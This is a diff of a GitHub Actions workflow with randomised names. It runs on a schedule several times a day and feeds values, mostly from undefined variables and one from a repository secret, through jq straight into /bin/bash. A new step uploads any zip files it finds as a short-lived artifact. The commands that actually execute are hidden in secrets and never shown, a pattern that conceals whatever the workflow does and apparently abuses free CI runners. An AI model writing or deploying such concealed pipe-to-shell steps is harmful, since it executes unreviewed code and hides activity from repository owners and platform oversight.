@@ -1,24 +1,26 @@
 name: duanhongbinhui
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '38 4/6 * * *'
 
-jobs:  # 4325
+  schedule:
+    - cron: '27 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: duanhongbinhui
         env:
-          lyar995: ${{ secrets.lyar995 }}
+          ysvvm6: ${{ secrets.ysvvm6 }}
         run: |
-          echo $lyar995 | jq -r .d44 | /bin/bash
-          echo $r290 | jq -r .iwaz55 | /bin/bash
-          echo $q57748 | jq -r .hbklq79 | /bin/bash
-          echo $iysn318 | jq -r .wrgjb32990 | /bin/bash
-          echo $vz143 | jq -r .i79026 | /bin/bash
-          echo $cbdg863 | jq -r .hnm127 | /bin/bash
-          echo $vn7 | jq -r .po335 | /bin/bash
-          echo $k50420 | jq -r .zbmyg731 | /bin/bash
+          printf '%s' "$ysvvm6" | jq -r .kaz44 | /bin/bash
+          echo $r03 | jq -r .ta1 | /bin/bash
+          echo $od9 | jq -r .lcm35 | /bin/bash
+          echo $xuvio31868 | jq -r .wrw64 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: PAVIUapb
+          path: "*.zip"
+          retention-days: 1
